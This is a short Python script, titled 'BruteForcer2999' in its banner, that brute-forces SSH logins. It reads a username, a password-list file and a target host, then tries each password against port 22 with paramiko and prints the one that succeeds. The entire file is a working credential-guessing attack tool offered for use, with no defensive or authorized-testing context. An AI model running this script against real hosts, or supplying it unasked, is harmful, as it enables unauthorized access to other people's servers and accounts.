import os
import socket
import sys

import paramiko
import termcolor
from art import text2art

print("WELCOME TO:")

text = "BruteForcer2999"

print(termcolor.colored(text2art(text), "blue"))

##Data collection + COLOR

u = "Please enter the "
p = "Provide the "
h1 = termcolor.colored(text="host ", color="light_magenta")
h2 = termcolor.colored(text="target", color="light_magenta")

user = input(u + termcolor.colored(text ="username", color="light_cyan" ) + ": ")
password = input(p + termcolor.colored("password file", color="light_green") + ": ")
host = input("What " + h1 + "would you like to " + h2 + ": ")

##Connection to the SSH server

def ssh_connect(pw, code=0):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    ssh.connect(host, port=22, username=user, password=pw)
  except paramiko.AuthenticationException:
    code = 1
  except socket.error:
    code = 2
  except paramiko.SSHException:
    code = 3
  ssh.close()
  return code

##Open file dubbed as: passwordFile.txt"

if not os.path.exists(password):
  print(termcolor.colored(text="File not found or incorrect path", color="red"))
  sys.exit(1)

with open(password, "r") as file:
  for line in file.readlines():
    password = line.strip()

    try:
      response = ssh_connect(password)

      if response == 0:
        print(termcolor.colored(text="Password found: " + password, color="green"))
        break
      elif response == 1:
        print(termcolor.colored(text="Login incorrect: " + password, color="light_red"))
      elif response == 2:
        print(termcolor.colored(text="Host not found: " + host, color="light_yellow"))
        sys.exit(1)
    except Exception as e:
      print(termcolor.colored(text="Error: " + str(e), color="magenta"))
      pass